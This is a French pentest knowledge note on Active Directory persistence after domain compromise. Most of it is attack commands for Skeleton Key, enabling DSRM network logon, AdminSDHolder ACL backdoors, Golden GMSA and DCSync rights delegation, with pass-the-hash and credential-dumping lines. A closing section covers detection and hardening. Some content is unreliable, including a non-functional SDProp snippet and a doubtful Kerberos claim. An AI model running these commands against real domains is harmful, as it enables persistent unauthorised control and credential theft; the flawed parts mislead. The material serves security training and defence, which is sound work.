---
title: "AD Persistence Avancée"
domain: "Applied Sciences"
subdomain: "Computer Science > Security > Active Directory"
tags: [active-directory, persistence, skeleton-key, dsrm, adminsdholder, golden-gmsa, pentest, sécurité]
date: "2026-03-23"
prerequis: ["[[Mimikatz]]", "[[ACL Abuse]]"]
---

# AD Persistence Avancée

Une entreprise découvre une intrusion, réinitialise les mots de passe, reconstruit les serveurs touchés et croit l'incident clos. Quelques semaines plus tard, l'attaquant est toujours là. C'est le problème de la **persistance** : une fois le domaine compromis, un attaquant expérimenté ne se contente pas d'un accès qui disparaîtra au prochain changement de mot de passe. Il détourne les mécanismes internes d'Active Directory, conçus pour la restauration, la réplication ou la compatibilité, afin de se ménager des portes dérobées qui survivent aux remédiations ordinaires. Ces techniques visent le fonctionnement même de l'annuaire plutôt que des comptes, et c'est ce qui les rend si difficiles à déloger.

Au-delà du Golden Ticket, Active Directory offre ainsi de nombreux mécanismes de persistance qui survivent aux rotations de mots de passe, aux réinitialisations de comptes et parfois même à la restauration de sauvegardes.

> [!important] Idée clé
> Chaque technique ci-dessous exploite un mécanisme qui existe pour une raison légitime (restauration, réplication, compatibilité) mais qui, une fois détourné, contourne la logique normale de "changer le mot de passe = couper l'accès". Comme le résume la dernière section : aucune persistance n'est parfaitement invisible, seulement plus ou moins bruyante.

> [!abstract] Définition — Persistance AD
> Ensemble des mécanismes qui maintiennent un accès privilégié à un domaine après la compromission initiale, en survivant aux rotations de mots de passe et aux remédiations. Les techniques ciblent des composants internes (LSASS, DSRM, AdminSDHolder, KDS Root Key, ACL de réplication) plutôt que des comptes. Aucune n'est totalement invisible : le choix se fait sur le compromis entre discrétion et durée.

## Skeleton Key

Backdoor du processus LSASS du DC : un mot de passe maître unique fonctionne pour tous les comptes.

```
Principe :
  → Patch en mémoire du processus LSASS du DC (pas de modification sur disque)
  → Injecte un mot de passe maître (par défaut "mimikatz") qui fonctionne pour N'IMPORTE quel compte
  → Le mot de passe réel du compte continue de fonctionner

Limitations :
  → Persiste seulement jusqu'au redémarrage du DC
  → Ne fonctionne pas avec Kerberos (seulement NTLM et MSV1_0)
  → Détectable par les EDR (patch en mémoire de LSASS)
  → Doit être réappliqué après chaque redémarrage
```

```powershell
# Prérequis : DA (Domain Admin) ou SeDebugPrivilege sur le DC

# Mimikatz — Skeleton Key sur le DC courant
misc::skeleton
# → "Skeleton Key patched !" — le DC accepte maintenant "mimikatz" comme mot de passe universel

# Tester
# net use \\DC01\C$ /user:DOMAINE\Administrator mimikatz
# Enter-PSSession -ComputerName DC01 -Credential (New-Object PSCredential("DOMAINE\alice", (ConvertTo-SecureString "mimikatz" -AsPlainText -Force)))

# Via CrackMapExec (à distance)
nxc smb DC01 -u Administrator -p Password -M skeleton_key
```

## DSRM — Directory Services Restore Mode

Le compte DSRM est le compte administrateur local de chaque DC, utilisé pour la restauration AD.

```
Principe :
  → Chaque DC possède un compte admin local "DSRM" (Directory Services Restore Mode)
  → Ce compte est distinct des comptes AD — son mot de passe n'est pas dans la base AD
  → Par défaut, il ne peut s'authentifier qu'en mode restauration (reboot)

Exploitation :
  → Si on obtient le hash DSRM → modifier le registre pour autoriser l'auth DSRM en ligne
  → Le compte DSRM devient un accès persistant au DC, indépendant d'AD
  → Même si tous les comptes DA sont réinitialisés → DSRM fonctionne toujours
```

```powershell
# Récupérer le hash DSRM
# Mimikatz (depuis le DC, avec SYSTEM)
lsadump::sam    # Le compte "Administrator" local = compte DSRM
# → Hash NTLM du compte DSRM (différent du compte Administrator de domaine)

# Modifier le registre pour autoriser l'auth DSRM sur le réseau
# (par défaut = 0 = seulement en mode restauration)
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\" `
    -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Valeurs :
# 0 = seulement en mode restauration AD (défaut)
# 1 = mode restauration ET si service AD arrêté
# 2 = TOUJOURS (dangereux — persistance totale)

# Utiliser le hash DSRM (Pass-the-Hash vers le DC)
# Le compte local s'appelle "Administrator" mais doit être référencé avec le hostname
python3 secretsdump.py '.\Administrator'@DC01 -hashes :DSRM_NTLM_HASH -just-dc
# Ou
python3 psexec.py 'DC01/Administrator'@DC01 -hashes :DSRM_NTLM_HASH

# Avec Mimikatz
sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:DSRM_HASH /run:cmd.exe
```

## AdminSDHolder

AdminSDHolder est un objet AD dont les ACLs sont copiées sur tous les objets "protégés" toutes les 60 minutes (SDProp — Security Descriptor Propagator).

```
Objets protégés (adminCount=1) :
  Domain Admins, Enterprise Admins, Schema Admins, Administrators
  Account Operators, Backup Operators, Print Operators, Server Operators
  + tous leurs membres actuels et passés

Exploitation :
  → Modifier les ACLs de AdminSDHolder pour donner des droits à un compte non privilégié
  → Toutes les 60 minutes, SDProp copie ces ACLs sur tous les objets protégés
  → Le compte non privilégié acquiert des droits GenericAll sur tous les comptes DA

Persistance :
  → Même si un admin remarque et supprime les droits d'un DA → SDProp les remet dans l'heure
  → Survit aux changements de membres des groupes privilegiés
```

```powershell
# PowerView — ajouter un droits à un compte sur AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domaine,DC=local' `
    -PrincipalIdentity alice `
    -Rights All `
    -Verbose

# Vérifier les ACLs
Get-DomainObjectAcl -Identity AdminSDHolder | `
    Where-Object {$_.SecurityIdentifier -match "alice"}

# Forcer SDProp immédiatement (sans attendre 60 min)
# Depuis le DC :
$sdprop = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MSDM.ProgID", "DC01"))
# Ou via registry key

# Avec impacket — dacledit.py
python3 dacledit.py -action write -target "CN=AdminSDHolder,CN=System,DC=domaine,DC=local" \
    -principal alice -rights FullControl \
    domaine.local/Administrator:Password

# Exploitation — une fois le SDProp passé, alice a GenericAll sur Domain Admins
# → Reset le mot de passe d'un DA, ajouter alice dans Domain Admins, etc.
```

## Golden GMSA (Group Managed Service Account)

Les GMSA (Group Managed Service Accounts) ont des mots de passe auto-générés et tournés automatiquement. La clé racine (KDS Root Key) permet de régénérer tous ces mots de passe.

```
Principe :
  → Les mots de passe GMSA sont dérivés de la KDS Root Key + GMSA attributes
  → Avec la KDS Root Key → calculer le mot de passe de n'importe quel GMSA
  → Persistance : même si le mot de passe GMSA tourne → toujours recalculable

Intérêt :
  Les GMSA sont souvent utilisés pour des services critiques (scripts, tâches planifiées)
  avec des accès très élevés → ouvrir l'accès à des ressources très sensibles
```

```bash
# Extraire la KDS Root Key (nécessite DA)
# Mimikatz
lsadump::dcsync /domain:domaine.local /user:"CN=HK Root Key Service,CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=domaine,DC=local"

# GoldenGMSA (outil Python)
pip install msldap impacket
python3 goldengmsa.py compute --sid S-1-5-21-...-GMSA_SID --kds-key KDS_KEY_HEX

# GoldenGMSA en PowerShell
# Import-Module .\GoldenGMSA.ps1
Get-KDSRootKey
Get-GMSAPassword -GMSASID S-1-5-21-...-1234 -KDSKey KDS_ROOT_KEY_HEX
```

## DCSync persistant — Délégation de réplication

```
DCSync nécessite les droits "Replicating Directory Changes All" sur le domaine.
Ces droits peuvent être assignés à un compte quelconque → DCSync permanent.
```

```powershell
# Donner les droits de réplication à un compte non privilégié
# PowerView
Add-DomainObjectAcl -TargetIdentity "DC=domaine,DC=local" `
    -PrincipalIdentity alice `
    -Rights DCSync

# Impacket — dacledit.py
python3 dacledit.py -action write \
    -target "DC=domaine,DC=local" \
    -principal alice \
    -rights "Replicating Directory Changes,Replicating Directory Changes All" \
    domaine.local/Administrator:Password

# Vérifier
Get-DomainObjectAcl -Identity "DC=domaine,DC=local" -ResolveGUIDs | \
    Where-Object { $_.IdentityReferenceName -eq "alice" }

# Utilisation
python3 secretsdump.py domaine.local/alice:Password123@DC01 -just-dc
```

## Modification du schéma AD

```
Technique avancée — rarement utilisée en pentest standard :
  → Modifier le schéma AD pour ajouter des attributs ou modifier des droits
  → Persistance très difficile à détecter (le schéma est rarement audité)

ATTENTION : les modifications de schéma sont irréversibles dans beaucoup de cas
→ À n'utiliser qu'avec accord explicite du client et dans un cadre très contrôlé
```

Chaque technique laisse une trace à qui sait où regarder. Pour l'**AdminSDHolder**, il faut auditer régulièrement les ACL de cet objet, alerter sur toute modification et surveiller les accès qui le ciblent (événement 4662). Pour le **DSRM**, on vérifie que la clé de registre `DsrmAdminLogonBehavior` vaut bien 0, on surveille les connexions locales aux contrôleurs de domaine (événement 4624) et on renouvelle régulièrement le mot de passe DSRM avec `ntdsutil`. Contre la **Skeleton Key**, les protections de LSASS, PPL et Credential Guard, empêchent le patch mémoire qui l'installe, et l'accès à LSASS se détecte par les événements 4673 et 4611 ou l'événement Sysmon 10.

Les **droits de réplication** détournés pour un DCSync persistant se repèrent en recensant qui possède `DS-Replication-Get-Changes-All` en dehors des contrôleurs de domaine, et par l'événement 4662 portant le GUID de la réplication (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`).

Au-delà de ces mesures ciblées, les bonnes pratiques générales valent contre toute persistance : le modèle en couches (Tier 0 pour les DC, Tier 1 pour les serveurs, Tier 2 pour les postes), des stations d'administration dédiées (PAW) pour les comptes les plus sensibles, une gestion des accès privilégiés à la demande (PIM) et des audits réguliers avec BloodHound, PingCastle ou Purple Knight. Aucune persistance n'étant parfaitement invisible, la surveillance finit toujours par payer.

## Pièges courants

> [!warning] Pièges courants
> - **DSRM password change non répliqué** : le compte DSRM (Directory Services Restore Mode) est local au DC. Son hash ne se réplique pas. Donc compromettre un DC ne donne PAS automatiquement DSRM sur les autres. À configurer DC par DC.
> - **Skeleton Key disparaît au reboot** : c'est une modification en mémoire de LSASS. Un redémarrage du DC = perte du Skeleton Key. À combiner avec une persistance qui survit au reboot.
> - **AdminSDHolder backdoor surveillée** : modifier l'ACL d'AdminSDHolder est détecté par les outils comme Purple Knight. Les changements se propagent toutes les heures à tous les comptes protégés → effet "trop visible".
> - **Golden Ticket invalidé par double rotation krbtgt** : si l'admin sait qu'il y a eu compromission et fait `Reset-KrbtgtKeys.ps1` deux fois (la rotation simple ne suffit pas, à cause de l'historique), tous les Golden tombent.
> - **Silver Ticket "infini" mais limité au service** : un Silver Ticket est valide jusqu'à l'expiration configurée (souvent 10 ans), mais seulement sur LE service ciblé. Pour un service-one, c'est durable. Pour un accès large, il en faut plusieurs.
> - **Compte machine "krbtgt fake"** : créer un compte machine personnalisé qu'on contrôle puis l'ajouter aux Domain Admins est une persistance simple mais loggée à la création.
> - **SID History injection** : ajouter un SID Domain Admin dans le SID History d'un compte = accès admin permanent. Mais visible avec `Get-ADUser -Properties SIDHistory`.
> - **Persistance via GPO** : créer une scheduled task dans une GPO appliquée aux DCs = exécution récurrente en SYSTEM. Détectable via audit GPO changes.
> - **Certificate persistence sans validation IdP** : un cert valide émis par AD CS reste exploitable jusqu'à expiration même si le user est désactivé. Toujours révoquer les certs lors d'un offboarding.
> - **Mécanismes "discrets" qui marquent les logs** : presque toutes les techniques de persistance laissent au moins UNE trace (event log, modification AD, ACL changée). La "persistance furtive" parfaite n'existe pas — on choisit le moins détecté pour la durée voulue.

> [!quiz] Pourquoi les droits ajoutés sur AdminSDHolder réapparaissent-ils après leur suppression manuelle ?
> Parce que le processus SDProp recopie le descripteur de sécurité d'AdminSDHolder sur tous les objets protégés (adminCount=1) toutes les 60 minutes. Tant que l'ACL source n'est pas nettoyée, les droits accordés à un compte non privilégié sont réappliqués au cycle suivant.
